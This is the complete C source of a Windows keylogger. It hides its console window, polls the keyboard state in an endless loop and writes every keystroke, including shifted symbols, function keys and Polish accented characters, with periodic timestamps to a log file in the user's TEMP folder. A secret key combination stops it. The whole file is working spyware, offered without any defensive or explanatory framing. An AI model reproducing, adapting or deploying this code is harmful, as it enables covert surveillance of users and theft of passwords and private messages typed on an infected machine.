#include <stdio.h>  
#include <time.h>  
#include <windows.h>  
#include <Winuser.h>  

bool cap=false;
  
bool skb(int i) { return !(bool)((GetAsyncKeyState(i)>>15)+1);}

void kbp(bool* buf)
{ int i=0,k;
  for (;i<256;i++)
   buf[i]=(bool)(GetAsyncKeyState(i)&1); 
}

int t_cl(char* plik,int sl)
{bool buf[256],allstate=false,alt=false,stan=false;
 int i,j=0,sek=0;
 int c=0;
 int k=1000/sl; // operations per second
 int sektime=60;
 FILE *f;
 time_t timenow;
 f=fopen(plik,"a+");
 if (f)
 {
 time ( &timenow );
 fprintf (f,"\n%s========================\n", asctime (localtime ( &timenow )) );
 fclose(f);
 }
 while(1)
  {
   f=fopen(plik,"a+");
   if (f)
    {
    Sleep(sl);
    memset(buf,0,256);
    stan=false;

    c=0;
    kbp(buf);
    for (i=0;i<256;i++) {c+=buf[i];}
    if (c==0)
        {
          j++;
          if (j>=k) {j=0; sek++;}
        }
        
    if ((sek>=sektime)&&((c!=0)&&(buf[1]!=1)))
      {
         j=0;sek=0;
         time ( &timenow );
         fprintf (f,"\n\n%s========================\n", asctime (localtime ( &timenow )) );
      }  
    if (sek>sektime)  sek=sektime;
    if ((c!=0)&&(buf[1]!=1)) sek=0;  
    
    if (skb(17)&&skb(163)&&skb(27)) return 0;
    if (buf[17]&&buf[163]) fprintf (f,"[CTRL_R]");
    if (buf[17]&&buf[162]&&(!buf[18]&&!buf[165])) fprintf (f,"[CTRL_L]");
    if (buf[17]&&buf[18]&&buf[162]&&buf[165]) {alt=!alt; }
    if (buf[18]&&buf[164]) fprintf (f,"[Alt_L]");
    if (buf[45]) fprintf (f,"[Ins]");
    if (buf[46]) fprintf (f,"[Del]");
//    if (buf[33]) fprintf (f,"[PgUp]");
//    if (buf[34]) fprintf (f,"[PgDn]");
//    if (buf[35]) fprintf (f,"[End]");
//    if (buf[36]) fprintf (f,"[Home]");
//    if (buf[27]) fprintf (f,"[Esc]");
    if (buf[32]) fprintf (f," ");
    if (buf[20]) cap=!cap; 
    if (buf[91]) fprintf (f,"[WinL]");
    if (buf[92]) fprintf (f,"[WinR]");
    if (buf[93]) fprintf (f,"[Menu]");
    if (buf[13]) fprintf (f,"\n[ENTER]\n");
    if (buf[8]) fprintf (f,"[Backsp]");
    if (buf[9]) fprintf (f,"[Tab]");
    if (buf[44]) fprintf (f,"[SysRq]");
    if (buf[145]) fprintf (f,"[ScrLck]");
    if (buf[19]) fprintf (f,"[Break]");
//    if (buf[38]) fprintf (f,"[K_Up]");
//    if (buf[40]) fprintf (f,"[K_Dn]");
//    if (buf[37]) fprintf (f,"[K_Left]");
//    if (buf[39]) fprintf (f,"[K_Right]");
    if (buf[144]) fprintf (f,"[NumLock]");
    if (buf[111]) fprintf (f,"[Num /]");
    if (buf[106]) fprintf (f,"[Num *]");
    if (buf[109]) fprintf (f,"[Num -]");
    if (buf[107]) fprintf (f,"[Num +]");
    if (buf[12]) fprintf (f,"[Num ]");
    if (buf[192]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"`"); else fprintf (f,"~");
    if (buf[189]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"-"); else fprintf (f,"_");
    if (buf[187]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"="); else fprintf (f,"+");
    if (buf[220]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"\\"); else fprintf (f,"|");
    if (buf[219]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"["); else fprintf (f,"{");
    if (buf[221]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"]"); else fprintf (f,"}");
    if (buf[186]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,";"); else fprintf (f,":");
    if (buf[222]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"'"); else fprintf (f,"\"");
    if (buf[188]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,","); else fprintf (f,"<");
    if (buf[190]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"."); else fprintf (f,">");
    if (buf[191]) if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"/"); else fprintf (f,"?");
    if (buf[48])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"0"); else fprintf (f,")");
    if (buf[49])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"1"); else fprintf (f,"!");
    if (buf[50])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"2"); else fprintf (f,"@");
    if (buf[51])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"3"); else fprintf (f,"#");
    if (buf[52])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"4"); else fprintf (f,"$");
    if (buf[53])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"5"); else fprintf (f,"%");
    if (buf[54])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"6"); else fprintf (f,"^");
    if (buf[55])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"7"); else fprintf (f,"&");
    if (buf[56])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"8"); else fprintf (f,"*");
    if (buf[57])  if (!skb(16)&&!(skb(161)||skb(160))) fprintf (f,"9"); else fprintf (f,"(");    
    for (i=96;i<106;i++)
     if (buf[i]) fprintf (f,"[Num %c]",i-48);
    if (buf[110]) fprintf (f,"[Num .]");
    for (i=112;i<124;i++) if (buf[i]) fprintf (f,"[F%d]",i-111);
    alt=alt&&skb(17)&&skb(18)&&skb(162)&&skb(165);
    for (i=65;i<91;i++)
     if (buf[i]) 
      if ((!skb(16)&&!(skb(161)||skb(160))&&(!cap))||((skb(16)&&(skb(161)||skb(160)))&&cap))
        {
		// local characters - adjust it to your needs
          if ((buf[65])&&alt) fprintf (f,"¹"); else
          if ((buf[67])&&alt) fprintf (f,"æ"); else
          if ((buf[69])&&alt) fprintf (f,"ê"); else          
          if ((buf[76])&&alt) fprintf (f,"³"); else
          if ((buf[78])&&alt) fprintf (f,"ñ"); else
          if ((buf[79])&&alt) fprintf (f,"ó"); else
          if ((buf[83])&&alt) fprintf (f,"œ"); else
          if ((buf[88])&&alt) fprintf (f,"Ÿ"); else
          if ((buf[90])&&alt) fprintf (f,"¿"); else
          fprintf (f,"%c",i+32); 
        }else 
        {
          if ((buf[65])&&alt) fprintf (f,"¥"); else
          if ((buf[67])&&alt) fprintf (f,"Æ"); else
          if ((buf[69])&&alt) fprintf (f,"Ê"); else
          if ((buf[76])&&alt) fprintf (f,"£"); else
          if ((buf[78])&&alt) fprintf (f,"Ñ"); else
          if ((buf[79])&&alt) fprintf (f,"Ó"); else
          if ((buf[83])&&alt) fprintf (f,"Œ"); else
          if ((buf[88])&&alt) fprintf (f,""); else
          if ((buf[90])&&alt) fprintf (f,"¯"); else
          fprintf (f,"%c",i);
        }    
      fclose(f);
    }
 } 
return 0;
}

int main()  
{char* path;
 char name[2048];
 char wt[1024];
 HWND hWnd;
 GetConsoleTitle(wt, 1024);
 hWnd=FindWindow(NULL,wt); 
 ShowWindow(hWnd,SW_HIDE); 
 memset(name,0,2048);
 path = getenv ("TEMP");
 strncat(name,path,2000);
 strcat (name,"\\");
 strcat (name,"kl0001.log");
 t_cl(name,5);
 
 return 0; 
} 
